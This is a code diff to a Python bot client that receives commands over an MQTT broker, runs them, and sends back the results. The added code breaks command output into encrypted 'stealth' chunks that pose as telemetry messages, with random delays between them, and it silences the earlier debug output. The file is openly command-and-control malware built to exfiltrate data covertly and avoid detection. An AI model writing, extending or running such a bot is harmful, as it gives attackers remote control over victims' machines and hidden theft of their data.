@@ -9,6 +9,7 @@ import base64
 import json
 import subprocess
 import time
+import threading
 
 import paho.mqtt.client as mqtt
 from consts import *
@@ -20,6 +21,39 @@ from utils import encrypt_payload_AES_then_b64, decrypt_payload
 # broker = central server that receives all messages
 #          and then routes them to the correct destinations.
 
+def heartbeat(client):
+    # todo
+    pass;
+
+
+def send_fragmented_response(client, raw_result):
+    """Breaks large results into 512-byte stealth packets"""
+    #  leave room for prefix 'CHK:00:00:' (approx 12 chars)
+    # 512 (target) - 4 (len prefix) - 12 (chunk metadata) = ~490
+    # todo is the metadata always 12 chars?
+    chunk_size = 480
+
+    # Split the big string into pieces
+    chunks = [raw_result[i:i + chunk_size] for i in range(0, len(raw_result), chunk_size)]
+    total = len(chunks)
+
+    for i, chunk_data in enumerate(chunks):
+        # 3 digits for chunk indices to support very large files
+        # Format:
+        #       CHK:[current_index]:[total_count]:[data]
+        fragment_text = f"CHK:{i+1:03d}:{total:03d}:{chunk_data}"
+
+        encrypted_chunk = encrypt_payload_AES_then_b64(fragment_text)
+
+        packet = {
+            "s_id": BOT_ID,
+            "type": "telemetry_update", # Masquerade type
+            DATA_KEY: encrypted_chunk
+        }
+        client.publish(TOPIC, json.dumps(packet))
+
+        # random delay
+        time.sleep(random.uniform(0.1, 0.4))
 
 
 def on_message(client, userdata, msg):
@@ -39,25 +73,30 @@ def on_message(client, userdata, msg):
 
             print(f"[DEBUG]: Received command: {action} {argument}, executing...")
             result = get_action_result(action, argument)
-
+            
+            print(f"[*] Dispatching response ({len(result)} bytes) in stealth chunks...")
+            send_fragmented_response(client, result)
             # Hide the response
-            encrypted_res_b64 = encrypt_payload_AES_then_b64(result)
-            res_packet = create_packet(encrypted_res_b64)
+            # encrypted_res_b64 = encrypt_payload_AES_then_b64(result)
+            # res_packet = create_bot_packet(encrypted_res_b64)
 
 
-            print("----")
-            print(f"[DEBUG]: showcase of the response being sent:")
-            print(json.dumps(res_packet, indent=4))
-            print("----")
+            # print("----")
+            # print(f"[DEBUG]: showcase of the response being sent:")
+            # print(json.dumps(res_packet, indent=4))
+            # print("----")
 
-            client.publish(TOPIC, json.dumps(res_packet))
+            # client.publish(TOPIC, json.dumps(res_packet))
 
     except:
         # ignore other messages
         pass
 
 
-def create_packet(encrypted_res_b64):
+
+
+
+def create_bot_packet(encrypted_res_b64):
     res_packet = {
         "s_id": BOT_ID,
         "type": "telemetry_ack",
